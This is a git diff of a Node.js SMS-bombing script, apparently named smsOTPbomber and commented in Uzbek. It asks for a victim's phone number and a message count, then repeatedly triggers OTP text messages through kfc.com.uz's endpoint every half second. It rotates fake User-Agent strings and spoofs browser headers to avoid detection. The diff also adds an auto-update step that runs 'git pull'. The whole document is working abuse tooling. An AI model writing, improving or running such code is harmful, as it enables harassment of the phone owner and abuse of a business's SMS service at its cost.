@@ -1,11 +1,11 @@
 const axios = require('axios');
 const readline = require('readline-sync');
-const fs = require('fs');
+const { execSync } = require('child_process');
 
-// ⬇️ Versiyani tekshiradigan funksiya
-const LOCAL_VERSION = '1.0.0'; // Mahalliy versiya
-const REMOTE_VERSION_URL = 'https://raw.githubusercontent.com/dilmuradd/smsOTPbomber/master/version.txt'; // GitHub dagi version.txt manzili
+const LOCAL_VERSION = '1.0.0';
+const REMOTE_VERSION_URL = 'https://raw.githubusercontent.com/dilmuradd/smsOTPbomber/master/version.txt';
 
+// Versiyani tekshiruvchi funksiya
 async function checkVersion() {
   try {
     const response = await axios.get(REMOTE_VERSION_URL);
@@ -15,18 +15,33 @@ async function checkVersion() {
       console.log(`
 ╔══════════════════════════════════════╗
 ║ ⚠️ YANGILANISH MAVJUD!                 ║
-║ 🔁 Yangi versiya: ${remoteVersion}                     ║
-║ 🔒 Iltimos, dasturni yangilang.         ║
+║ 🔁 Yangi versiya: ${remoteVersion}     ║
+║ 📌 Sizning versiyangiz: ${LOCAL_VERSION} ║
 ╚══════════════════════════════════════╝
       `);
-      process.exit(); // Dasturni to‘xtatadi
+
+      const answer = readline.question('🔄 Yangilashni xohlaysizmi? (Y/N): ').toLowerCase();
+
+      if (answer === 'y') {
+        console.log('⬇️ Yangilanish jarayoni...');
+        try {
+          execSync('git pull', { stdio: 'inherit' });
+          console.log('✅ Yangilandi! Dastur qayta ishga tushmoqda...\n');
+          process.exit(0); // Chiqib foydalanuvchi qayta ishga tushiradi
+        } catch (err) {
+          console.error('❌ Yangilashda xatolik:', err.message);
+          process.exit(1);
+        }
+      } else {
+        console.log('❌ Dasturni yangilamasdan chiqildi.');
+        process.exit(0);
+      }
     }
   } catch (err) {
     console.log('⚠️ Versiyani tekshirib bo‘lmadi:', err.message);
   }
 }
 
-// Asosiy ishlarni boshlashdan oldin versiyani tekshirish
 checkVersion().then(() => {
   // Chiroyli chizilgan interfeys
   console.log(`
@@ -41,18 +56,18 @@ checkVersion().then(() => {
   const maxCount = parseInt(readline.question('📈 Nechta SMS yuborilishi kerak (maksimal 999): '));
 
   // Intervalli va hisoblagich
-  const intervalTime = 500; // 5 sekundda bir yuboradi
+  const intervalTime = 500; // 0.5 sekundda bir yuboradi
   let count = 0;
-  let interval;  // intervalni faqat bir marta e'lon qilamiz
+  let interval;
 
-  // Tasodifiy User-Agent yaratish uchun function
+  // Tasodifiy User-Agent generatori
   function getRandomUserAgent() {
     const userAgents = [
-      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
-      'Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0',
-      'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
-      'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36'
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...',
+      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...',
+      'Mozilla/5.0 (X11; Linux x86_64)...',
+      'Mozilla/5.0 (Windows NT 6.1; WOW64)...',
+      'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL)...'
     ];
     return userAgents[Math.floor(Math.random() * userAgents.length)];
   }
@@ -60,7 +75,7 @@ checkVersion().then(() => {
   // OTP yuborish funksiyasi
   function sendOTP() {
     if (count >= maxCount) {
-      clearInterval(interval);  // Maksimal yuborish soniga yetganda intervalni to‘xtatish
+      clearInterval(interval);
       console.log('🔔 Yuborish tugadi.');
       return;
     }
@@ -74,7 +89,7 @@ checkVersion().then(() => {
         'X-Requested-With': 'XMLHttpRequest',
         'Origin': 'https://kfc.com.uz',
         'Referer': 'https://kfc.com.uz/',
-        'User-Agent': getRandomUserAgent(), // Tasodifiy User-Agent
+        'User-Agent': getRandomUserAgent(),
         'Accept': 'application/json, text/javascript, */*; q=0.01',
         'Accept-Language': 'en-US,en;q=0.5',
         'Accept-Encoding': 'gzip, deflate, br',
@@ -84,9 +99,9 @@ checkVersion().then(() => {
         'Sec-Gpc': '1',
         'Priority': 'u=0',
         'Te': 'trailers',
-        'Cookie': 'HttpOnly; PHPSESSID=079fe9564589c58d265b9b3789cfeb24; G_ENABLED_IDPS=google; CookieConsent={stamp:%27oKwEuZv1KPYNeiiPS3S7Nc4fXl90KBsTfJrmiZse97LzWmtg4dCwtg==%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1747175855095%2Cregion:%27uz%27}'
+        'Cookie': 'PHPSESSID=dummy-session; G_ENABLED_IDPS=google; CookieConsent={...}'
       },
-    }).then((response) => {
+    }).then(() => {
       count++;
       console.log(`🔁 ${count}. SMS yuborildi!`);
     }).catch((error) => {
@@ -94,7 +109,7 @@ checkVersion().then(() => {
     });
   }
 
-  // SMS yuborish jarayonini boshlash
+  // Yuborishni boshlash
   console.log(`🔁 Kod yuborish boshlandi → ${phone}`);
   interval = setInterval(sendOTP, intervalTime);
 });
